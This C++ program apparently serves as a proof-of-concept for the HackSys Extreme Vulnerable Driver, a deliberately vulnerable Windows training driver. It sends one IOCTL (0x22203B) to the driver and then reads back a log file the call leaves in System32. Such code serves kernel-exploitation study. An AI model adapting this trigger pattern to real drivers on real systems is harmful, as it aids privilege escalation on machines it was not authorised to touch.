#include <iostream>
#include <Windows.h>
#define IOCTL_CODE 0x22203B

int main() {
    DWORD LogSize = 0;
    DWORD BytesRead = 0;
    char* LogData = NULL;
    HANDLE LogHandle = INVALID_HANDLE_VALUE;
    DWORD BytesReturned = 0;
    HANDLE DriverHandle = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", GENERIC_ALL, FILE_SHARE_DELETE | FILE_SHARE_WRITE | FILE_SHARE_READ,
        NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (DriverHandle == INVALID_HANDLE_VALUE) {
        printf("[-] DriverHandle = INVALID_HANDLE_VALUE\n");
        return FALSE;
    }
    if (!DeviceIoControl(DriverHandle, IOCTL_CODE, NULL, NULL, NULL, NULL, &BytesReturned, NULL)) {
        printf("[-] Driver operation failed\n");
        CloseHandle(DriverHandle);
        return FALSE;
    }
    printf("[+] Driver operation succeeded\n");
    CloseHandle(DriverHandle);
    LogHandle = CreateFileA("C:\\Windows\\System32\\HEVD.log", GENERIC_ALL, FILE_SHARE_DELETE | FILE_SHARE_WRITE | FILE_SHARE_READ,
        NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (LogHandle == INVALID_HANDLE_VALUE) {
        printf("[-] DriverHandle = INVALID_HANDLE_VALUE\n");
        return FALSE;
    }
    LogSize = GetFileSize(LogHandle, 0);
    LogData = (char*)malloc(LogSize);
    if (LogData == NULL) {
        printf("[-] Failed to allocate log buffer: %d\n", GetLastError());
        CloseHandle(LogHandle);
        return FALSE;
    }
    if (!ReadFile(LogHandle, LogData, LogSize, &BytesRead, NULL) || BytesRead != LogSize) {
        printf("[-] Failed to read log information: %d\n", GetLastError());
        free(LogData);
        CloseHandle(LogHandle);
        return FALSE;
    }
    CloseHandle(LogHandle);
    printf("[+] Driver log information: \"%s\"\n", LogData);
    free(LogData);
    return TRUE;
}

